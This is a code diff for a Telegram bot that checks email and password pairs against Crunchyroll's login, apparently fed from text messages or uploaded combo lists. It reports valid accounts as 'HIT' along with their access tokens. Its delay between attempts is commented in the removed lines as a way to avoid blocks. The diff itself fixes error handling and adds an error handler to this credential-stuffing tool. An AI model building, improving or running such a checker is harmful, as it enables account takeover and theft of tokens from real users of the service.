@@ -36,12 +36,9 @@ def crunchyroll_check(email: str, password: str):
         if r.status_code == 200 and "access_token" in r.text:
             token = r.json().get("access_token", "")
             return f"✅ **HIT** ✅\nEmail: `{email}`\nToken: `{token[:55]}...`"
-        elif r.status_code in [400, 401]:
-            return "❌ Invalid credentials"
         else:
-            return f"❌ Failed ({r.status_code})"
-
-    except Exception as e:
+            return "❌ Invalid credentials"
+    except:
         return "⚠️ Error"
 
 
@@ -76,7 +73,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         result = crunchyroll_check(email, pwd)
         await update.message.reply_text(result)
         
-        await asyncio.sleep(2.5)   # Increased delay to avoid blocks
+        await asyncio.sleep(2.5)
 
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -102,6 +99,11 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await asyncio.sleep(2.5)
 
 
+# Fixed Error Handler (removes "No error handlers are registered" warning)
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
+    print(f"Bot Error: {context.error}")
+
+
 def main():
     TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
     if not TOKEN:
@@ -109,9 +111,13 @@ def main():
         return
 
     app = Application.builder().token(TOKEN).build()
+    
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.TEXT, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    
+    # This line fixes the "No error handlers are registered" error
+    app.add_error_handler(error_handler)
 
     print("🚀 Improved Bot Running...")
     app.run_polling()
